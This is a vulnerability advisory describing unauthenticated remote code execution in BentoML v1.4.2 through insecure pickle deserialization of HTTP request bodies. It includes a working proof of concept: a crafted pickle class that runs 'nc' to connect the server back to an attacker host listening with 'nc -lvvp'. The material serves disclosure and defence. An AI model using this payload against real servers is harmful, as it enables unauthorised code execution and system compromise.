summary: "BentoML Allows Remote Code Execution (RCE) via Insecure Deserialization\n### Summary\n\
  A Remote Code Execution (RCE) vulnerability caused by insecure deserialization has been identified\
  \ in the latest version(v1.4.2) of BentoML. It allows any unauthenticated user to execute\
  \ arbitrary code on the server.\n\n### Details\nIt exists an unsafe code segment in `serde.py`:\
  \ \n```Python\ndef deserialize_value(self, payload: Payload) -> t.Any:\n    if \"buffer-lengths\"\
  \ not in payload.metadata:\n        return pickle.loads(b\"\".join(payload.data))\n```\nThrough\
  \ data flow analysis, it is confirmed that the `payload `content is sourced from an HTTP request,\
  \ which can be fully manipulated by the attack. Due to the lack of validation in the code,\
  \ maliciously crafted serialized data can execute harmful actions during deserialization.\n\
  \n### PoC\nEnvironment:\n\n- Server host:\n  - IP: 10.98.36.123\n  - OS: Ubuntu \n- Attack\
  \ host:\n  - IP: 10.98.36.121\n  - OS: Ubuntu \n\n\n\n1. Follow the instructions on the BentoML\
  \ official README(https://github.com/bentoml/BentoML) to set up the environment.\n\n1.1 Install\
  \ BentoML (Server host: 10.98.36.123) :\n` pip install -U bentoml`\n\n1.2 Define APIs in a\
  \ `service.py` file (Server host: 10.98.36.123) :\n``` Python\nfrom __future__ import annotations\n\
  \nimport bentoml\n\n@bentoml.service(\n    resources={\"cpu\": \"4\"}\n)\nclass Summarization:\n\
  \    def __init__(self) -> None:\n        import torch\n        from transformers import pipeline\n\
  \n        device = \"cuda\" if torch.cuda.is_available() else \"cpu\"\n        self.pipeline\
  \ = pipeline('summarization', device=device)\n\n    @bentoml.api(batchable=True)\n    def\
  \ summarize(self, texts: list[str]) -> list[str]:\n        results = self.pipeline(texts)\n\
  \        return [item['summary_text'] for item in results]\n```\n\n\n1.3 Run the service code\
  \ (Server host: 10.98.36.123) :\n``` Bash\npip install torch transformers  # additional dependencies\
  \ for local run\n\nbentoml serve\n```\n\n\n2. Start nc listening on the attacking host (Attack\
  \ host: 10.98.36.121) :\n`nc -lvvp 1234`\n\n3. Send maliciously crafted request (Attack host:\
  \ 10.98.36.121) :\n``` Python\nimport pickle\nimport os\nimport requests\n\nheaders = {'Content-Type':\
  \ 'application/vnd.bentoml+pickle'}\n\nclass Evil:\n    def __reduce__(self):\n        return(os.system,\
  \ ('nc 10.98.36.121 1234',))\n\npayload = pickle.dumps(Evil())\n\nrequests.post(\"http://10.98.36.123:3000/summarize\"\
  , data=payload, headers=headers)\n```\n\n\n4. Attack success (Attack host: 10.98.36.121) :\n\
  The server host(10.98.36.123) has connected to the attacker's host(10.98.36.121) listening\
  \ on port 1234.\n![nc](https://github.com/user-attachments/assets/858cba4a-6880-498f-b922-dd9a2dc78a85)\n\
  \n\n\n### Impact\nRemote Code Execution (RCE)."
